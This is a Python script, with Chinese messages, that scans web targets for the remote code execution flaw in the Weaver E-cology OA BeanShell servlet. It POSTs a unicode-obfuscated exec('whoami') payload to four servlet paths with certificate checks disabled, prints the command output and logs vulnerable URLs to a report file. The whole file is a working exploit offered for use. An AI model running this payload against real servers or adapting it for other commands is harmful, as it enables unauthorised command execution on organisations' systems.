import requests
import time

filename = "./reps/E_cology_OA_Beanshell组件rce-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}
payload = """bsh.script=\\u0065\\u0078\\u0065\\u0063("whoami");&bsh.servlet.output=raw"""

Url_Payload1="/bsh.servlet.BshServlet"
Url_Payload2="/weaver/bsh.servlet.BshServlet"
Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
Url_Payload4="/oa/bsh.servlet.BshServlet"

def E_cology_OA_Beanshell1(i):
    url = i + Url_Payload1
    try:
        request = requests.post(headers=headers, url=url, data=payload, timeout=5, verify=False)
        if request.status_code == 200:
            if ";</script>" not in request.text:
                if "Login.jsp" not in request.text:
                    if "Error" not in request.text:
                        if "<head>" not in request.text:
                            print("\033[0;32;40m[+] {} 疑似存在E_cology_OA_Beanshell组件rce漏洞！！！\033[0m".format(url))
                            print('可Post手动传值测试: {}'.format(payload))
                            print('whoami: {}'.format(request.text.strip('\n')))
                            f = open(filename, "a+", encoding="utf-8")
                            f.write(request.url)
                            f.write("\n")
                            f.close()
                        else:
                            print("[-] {} 未发现E_cology_OA_Beanshell组件rce漏洞".format(url))
    except:
        print("url:{} 请求失败".format(i))

def E_cology_OA_Beanshell2(i):
    url = i + Url_Payload2
    try:
        request = requests.post(headers=headers, url=url, data=payload, timeout=5, verify=False)
        if request.status_code == 200:
            if ";</script>" not in request.text:
                if "Login.jsp" not in request.text:
                    if "Error" not in request.text:
                        if "<head>" not in request.text:
                            print("\033[0;32;40m[+] {} 疑似存在E_cology_OA_Beanshell组件rce漏洞！！！\033[0m".format(url))
                            print('可Post手动传值测试: {}'.format(payload))
                            print('whoami: {}'.format(request.text.strip('\n')))
                            f = open(filename, "a+", encoding="utf-8")
                            f.write(request.url)
                            f.write("\n")
                            f.close()
                        else:
                            print("[-] {} 未发现E_cology_OA_Beanshell组件rce漏洞".format(url))
    except:
        print("url:{} 请求失败".format(i))

def E_cology_OA_Beanshell3(i):
    url = i + Url_Payload3
    try:
        request = requests.post(headers=headers, url=url, data=payload, timeout=5, verify=False)
        if request.status_code == 200:
            if ";</script>" not in request.text:
                if "Login.jsp" not in request.text:
                    if "Error" not in request.text:
                        if "<head>" not in request.text:
                            print("\033[0;32;40m[+] {} 疑似存在E_cology_OA_Beanshell组件rce漏洞！！！\033[0m".format(url))
                            print('可Post手动传值测试: {}'.format(payload))
                            print('whoami: {}'.format(request.text.strip('\n')))
                            f = open(filename, "a+", encoding="utf-8")
                            f.write(request.url)
                            f.write("\n")
                            f.close()
                        else:
                            print("[-] {} 未发现E_cology_OA_Beanshell组件rce漏洞".format(url))
    except:
        print("url:{} 请求失败".format(i))

def E_cology_OA_Beanshell4(i):
    url = i + Url_Payload4
    try:
        request = requests.post(headers=headers, url=url, data=payload, timeout=5, verify=False)
        if request.status_code == 200:
            if ";</script>" not in request.text:
                if "Login.jsp" not in request.text:
                    if "Error" not in request.text:
                        if "<head>" not in request.text:
                            print("\033[0;32;40m[+] {} 疑似存在E_cology_OA_Beanshell组件rce漏洞！！！\033[0m".format(url))
                            print('可Post手动传值测试: {}'.format(payload))
                            print('whoami: {}'.format(request.text.strip('\n')))
                            f = open(filename, "a+", encoding="utf-8")
                            f.write(request.url)
                            f.write("\n")
                            f.close()
                        else:
                            print("\033[0;31;40m[-] {} 未发现E_cology_OA_Beanshell组件rce漏洞\033[0m".format(url))
    except:

        print("url:{} 请求失败".format(i))